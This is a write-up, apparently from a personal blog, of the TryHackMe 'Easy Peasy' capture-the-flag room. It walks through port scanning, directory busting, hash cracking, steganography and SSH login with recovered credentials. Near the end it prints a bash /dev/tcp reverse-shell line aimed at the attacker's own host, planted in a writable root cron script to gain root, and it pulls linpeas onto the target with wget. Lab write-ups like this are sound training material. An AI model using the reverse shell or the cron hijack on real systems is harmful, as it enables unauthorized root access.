---
title: Easy Peasy Walkthrough WriteUp
layout: post
published: true
---

Link to the machine : [https://tryhackme.com/room/easypeasyctf](https://tryhackme.com/room/easypeasyctf)

Scanning this machine using NMAP `nmap -vv -oN nmap-basic IP`, doing this way, NMAP searches the top ports and gives a brief about the top ports present, in a way more faster manner, when compared with including all the flags. Then we can use flags on specific ports. - `nmap -sC -sV -vv -A -px,x,x -oN nmap-detailed IP` <br>
On completion, NMAP gives 1 port open `80` and it seems to be running a ngnix web server.

We can start to enumarate the web-server and find out the directories, we could `wfuzz`, `gobuster`, etc.
I personally like `gobuster` for this task so we can run it side by side NMAP, for getting all the ports.(if any)

Till these tools run, we can go and manually search for some common files that are expected to be in a webserver like `robots.txt` <br>
Not much of a luck there!! It doesn't give us any useful info,
```
User-Agent:*
Disallow:/
Robots Not Allowed
```

While the NMAP is still running we can analyze the results spit by gobuster.<br>
```
$ gobuster dir -u IP -w ~/SecLists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://IP
[+] Threads:        10
[+] Wordlist:       /home/cardinal/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/09 01:59:47 Starting gobuster
===============================================================
/hidden (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
===============================================================
2020/08/09 02:03:41 Finished
===============================================================
```

Few new files, could be seen and one seems interesting - `hidden` have 301 (Moved Permanently) status code. But inspite of that we shall check that in our browser. And we are greeted with an image incorporated directly from pixabay. So, nothing useful...keeping on our directory busting, inside hidden we found another intersting directory `/xxxxxxxxxxx` and in it's source code there is a base64 hash which decodes to the first flag.

In the meanwhile, NMAP all-ports scan is complete and we found there are 3 ports open in total. Running those 3 ports with `nmap -sC -sV -p80,6498,65524 -vv -oN nmap-detailed -T4 IP`, which yielded the result,
```
PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack nginx 1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf5hzG6d/mEZZIeldje4ZWpwq0zAJWvFf1IzxJX1ZuOWIspHuL0X0z6qEfoTxI/o8tAFjVP/B03BT0WC3WQTm8V3Q63lGda0CBOly38hzNBk8p496scVI9WHWRaQTS4I82I8Cr+L6EjX5tMcAygRJ+QVuy2K5IqmhY3jULw/QH0fxN6Heew2EesHtJuXtf/33axQCWhxBckg1Re26UWKXdvKajYiljGCwEw25Y9qWZTGJ+2P67LVegf7FQu8ReXRrOTzHYL3PSnQJXiodPKb2ZvGAnaXYy8gm22HMspLeXF2riGSRYlGAO3KPDcDqF4hIeKwDWFbKaOwpHOX34qhJz
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN8/fLeNoGv6fwAVkd9oVJ7OIbn4117grXfoBdQ8vY2qpkuh30sTk7WjT+Kns4MNtTUQ7H/sZrJz+ALPG/YnDfE=
|   256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNgw/EuawEJkhJk4i2pP4zHfUG6XfsPHh6+kQQz3G1D
65524/tcp open  http    syn-ack Apache httpd 2.4.43 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So, we got more things to look upon,
1. Apache WebServer
2. Ngnix WebServer
3. SSH

We moved to enumerate the Apache WebServer http://IP:65524/ and it gives a basic Apache config page, firstly we run gobuster in the background. Since gobuster by default searches for websites on port 80, we have to use proxy and cook the command like this - `gobuster dir -p http://IP:65524 -u http://IP -w ~/SecLists/Discovery/Web-Content/common.txt`.
<br><br>
    Manually looking through the source code of the same we found some interesting stuff,
```
<span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
</span>
```

Looking at this message it comes to mind, that the hash must be baseSomething. Let's jump into CyberChef and check our claim.
<br>
The encoding turns out to be `base62` which gives - `/xxxxxxxxxxxxxxx`. This looks like some kind of directory <- We will look this later.
<br>
<br>
Further go through the source code, it contains lots of juicy information - a flag.

Since it is a web server, we will go for `robots.txt`, there we find some more juicy stuff,
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
Here we get a hash(which seems to me like a md5 hash), our first step will be to crack it, for this we are gonna use a website [MD5Hashing](md5hashing.net), which yields us another flag.


After we are satisfied with whatever we have done with this page, then we move to `/xxxxxxxxxxxxxxx`, and once again we are greeted with an image and looking the source code gave us another hash. So, we have two things:
* Image
* Hash

```
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
```

On doing some research online, found out a tool called [hash-identifier](https://gitlab.com/kalilinux/packages/hash-identifier) and passing the hash through it, it gives us a list of possible hashes.

```
 HASH: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
```

Trying to crack the hash one by one using MD5Hashing using the given hashes, a hit came in `GOST` hashing algorithm. It got cracked!
<br>
We have no clue for what this password will be used, so we will keep it on hold. We hav got a image and we can try some stegography using `steghide` and this password might be used for extraction. Let's see!

```
$ steghide extract -sf binarycodepixabay.jpg 
Enter passphrase: 
wrote extracted data to "secrettext.txt".
```

Used that password to extract the `secrettext.txt`. And in that we get another set of credentails. And password seems to be encrypted!
```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

On decoding the password we have another set of credentials and the only place I could think of now is SSH that we found on port 6498. Let give it a try!

Voila! We got into the server!!

And retrive the user.txt, with the following message,
```
$ ssh boring@10.10.30.104 -p 6498
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.30.104's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{xxxxxxxxxxxxxxx}
```

Trying to do some rotation using ROT13 may provide us with some sensible output. And yes, it did, we have another flag! 
<br>
Since, we have the user's flag now we also have to find the root's flag. Let's try for that...
As we are into the machine, we can try and enumerate the machine by running linpeas.
<br>
To get the linpeas into the remote machine, I created a simple python web server - and used wget to download the file from my machine to remote machine.

On my machine...
```
$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
```

On remote machine...
```
boring@kral4-PC:~$ wget myIP:1234/linpeas.sh
```

And made `linpeas.sh` executeable and run it. While analyzing the log generated by linpeas, one specific file bothered me the most - `/var/www/.mysecretcronjob.sh `

This file has permission and this can be run as root so we can use this to get the root flag, by getting a reverse shell on this machine as a root.

```
bash -i >& /dev/tcp/myIP/8080 0>&1
```

After opening a listener in our machine, we run `crontab` in remote machine and we get back a shell which is root. Yay!!

Voila! we get a flag, which was hidden in `.root.txt`!!

Box Pwned!!
